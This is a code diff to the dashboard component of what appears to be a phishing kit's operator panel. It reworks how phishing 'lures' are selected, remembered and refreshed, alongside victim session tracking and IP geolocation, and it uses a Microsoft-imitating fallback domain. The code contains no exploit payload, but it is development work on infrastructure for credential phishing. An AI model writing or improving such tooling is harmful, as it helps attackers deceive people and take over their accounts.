@@ -197,94 +197,6 @@ export default function Dashboard() {
     );
   }, []);
 
-  const fetchFullLink = useCallback(async () => {
-    return withLoading(async () => {
-      try {
-        // Get saved lure ID from localStorage if it exists
-        const savedLureId = localStorage.getItem("selectedLureId");
-
-        // Only fetch from API if we have a selected lure or a saved ID
-        if (selectedLure || savedLureId) {
-          const lureId = selectedLure?.id || savedLureId;
-
-          // Also fetch all available lures
-          const [linkResponse, luresResponse] = await Promise.all([
-            fetch(`/api/full-link?lureId=${lureId}`),
-            fetch("/api/lures"),
-          ]);
-
-          if (!linkResponse.ok) {
-            throw new Error("Failed to fetch link");
-          }
-
-          const data = await linkResponse.json();
-          // Only set the link if we have valid data and it's not the fallback URL
-          if (data.fullUrl && data.fullUrl !== "https://msoft.cam/wYyGBBeI") {
-            setFullLink(data.fullUrl);
-          }
-
-          if (luresResponse.ok) {
-            const luresData = await luresResponse.json();
-            setLures(luresData.lures || []);
-
-            // If we have lures
-            if (luresData.lures && luresData.lures.length > 0) {
-              // If we have a saved lure ID, try to find it
-              if (savedLureId) {
-                const savedLure = luresData.lures.find(
-                  (lure) => lure.id === savedLureId
-                );
-                if (savedLure) {
-                  setSelectedLure(savedLure);
-
-                  // Fetch the specific lure URL if we restored from localStorage
-                  if (!selectedLure) {
-                    const index = luresData.lures.findIndex(
-                      (lure) => lure.id === savedLureId
-                    );
-                    if (index >= 0) {
-                      try {
-                        const lureUrlResponse = await fetch(
-                          `/api/lure-url?lureIndex=${index}`
-                        );
-                        if (lureUrlResponse.ok) {
-                          const urlData = await lureUrlResponse.json();
-                          if (
-                            urlData.url &&
-                            urlData.url !== "https://msoft.cam/wYyGBBeI"
-                          ) {
-                            setFullLink(urlData.url);
-                          }
-                        }
-                      } catch (error) {
-                        console.error(
-                          "Error fetching restored lure URL:",
-                          error
-                        );
-                      }
-                    }
-                  }
-                }
-              }
-            }
-          }
-        } else {
-          // If no lure is selected, just fetch the lures list
-          const luresResponse = await fetch("/api/lures");
-          if (luresResponse.ok) {
-            const luresData = await luresResponse.json();
-            setLures(luresData.lures || []);
-          }
-
-          // Clear the full link if no lure is selected
-          setFullLink("");
-        }
-      } catch (error) {
-        console.error("Error fetching link:", error);
-      }
-    });
-  }, [selectedLure]);
-
   const fetchGeoData = async (ip: string): Promise<GeoData | null> => {
     if (!ip || ip.trim() === "") {
       return null;
@@ -555,16 +467,128 @@ export default function Dashboard() {
     };
 
     fetchData();
-    fetchFullLink();
+
+    // Instead of calling fetchFullLink directly, create a wrapper to ensure localStorage is checked first
+    const initializeLureSelection = async () => {
+      try {
+        // First fetch all available lures
+        const luresResponse = await fetch("/api/lures");
+        if (luresResponse.ok) {
+          const luresData = await luresResponse.json();
+          const availableLures = luresData.lures || [];
+          setLures(availableLures);
+
+          // Get saved lure ID from localStorage if it exists
+          const savedLureId = localStorage.getItem("selectedLureId");
+
+          // If we have lures and a saved ID
+          if (availableLures.length > 0 && savedLureId) {
+            // Find the saved lure in the available lures
+            const savedLure = availableLures.find(
+              (lure) => lure.id === savedLureId
+            );
+
+            // If found, select it and fetch its link
+            if (savedLure) {
+              setSelectedLure(savedLure);
+
+              try {
+                // Fetch the specific lure URL
+                const lureIndex = availableLures.findIndex(
+                  (lure) => lure.id === savedLureId
+                );
+                if (lureIndex >= 0) {
+                  const response = await fetch(
+                    `/api/lure-url?lureIndex=${lureIndex}`
+                  );
+                  if (response.ok) {
+                    const data = await response.json();
+                    if (data.url && data.url !== "https://msoft.cam/wYyGBBeI") {
+                      setFullLink(data.url);
+                      return; // Successfully loaded the lure from localStorage
+                    }
+                  }
+                }
+
+                // Fallback to full-link API if needed
+                const linkResponse = await fetch(
+                  `/api/full-link?lureId=${savedLureId}`
+                );
+                if (linkResponse.ok) {
+                  const data = await linkResponse.json();
+                  if (
+                    data.fullUrl &&
+                    data.fullUrl !== "https://msoft.cam/wYyGBBeI"
+                  ) {
+                    setFullLink(data.fullUrl);
+                    return; // Successfully loaded the lure
+                  }
+                }
+              } catch (error) {
+                console.error("Error fetching saved lure URL:", error);
+              }
+            } else {
+              // If the saved lure ID is invalid (lure no longer exists), clear it
+              localStorage.removeItem("selectedLureId");
+            }
+          }
+
+          // If we couldn't load from localStorage or no selection was previously made
+          if (availableLures.length > 0) {
+            // Don't auto-select any lure - let the user choose explicitly
+            setSelectedLure(null);
+            setFullLink("");
+          }
+        }
+      } catch (error) {
+        console.error("Error initializing lure selection:", error);
+      }
+    };
+
+    initializeLureSelection();
 
     // Set up polling interval for data refresh
     const interval = setInterval(() => {
       fetchData();
-      fetchFullLink();
+
+      // When refreshing, don't reset the lure selection to avoid disrupting the user
+      // Instead of fetchFullLink, we just check if the link needs a refresh
+      if (selectedLure) {
+        fetch(`/api/full-link?lureId=${selectedLure.id}`)
+          .then((response) => {
+            if (response.ok) return response.json();
+            throw new Error("Failed to refresh link");
+          })
+          .then((data) => {
+            if (data.fullUrl && data.fullUrl !== "https://msoft.cam/wYyGBBeI") {
+              setFullLink(data.fullUrl);
+            }
+          })
+          .catch((error) => {
+            console.error("Error refreshing link:", error);
+          });
+      }
     }, 30000); // Refresh data every 30 seconds
 
     const handleLinkUpdate = () => {
-      fetchFullLink();
+      if (selectedLure) {
+        fetch(`/api/full-link?lureId=${selectedLure.id}`)
+          .then((response) => {
+            if (response.ok) return response.json();
+            throw new Error("Failed to refresh link after settings update");
+          })
+          .then((data) => {
+            if (data.fullUrl && data.fullUrl !== "https://msoft.cam/wYyGBBeI") {
+              setFullLink(data.fullUrl);
+            }
+          })
+          .catch((error) => {
+            console.error(
+              "Error refreshing link after settings update:",
+              error
+            );
+          });
+      }
     };
 
     window.addEventListener("linkSettingsUpdated", handleLinkUpdate);
@@ -572,7 +596,7 @@ export default function Dashboard() {
       clearInterval(interval);
       window.removeEventListener("linkSettingsUpdated", handleLinkUpdate);
     };
-  }, [calculateStats, fetchFullLink, geoCache, itemsPerPage, sessions.length]);
+  }, [calculateStats, geoCache, itemsPerPage, sessions.length, selectedLure]);
 
   // Effect to fetch the service status on load
   useEffect(() => {
@@ -809,7 +833,11 @@ export default function Dashboard() {
                 {lures.length > 0 ? (
                   <select
                     className="text-gray-200 bg-[#1B2028] border border-gray-700 rounded px-2 py-1 text-sm"
-                    value={selectedLure ? lures.indexOf(selectedLure) : -1}
+                    value={
+                      selectedLure
+                        ? lures.findIndex((lure) => lure.id === selectedLure.id)
+                        : -1
+                    }
                     onChange={(e) => handleLureChange(e.target.value)}
                   >
                     <option value="-1">Select link</option>
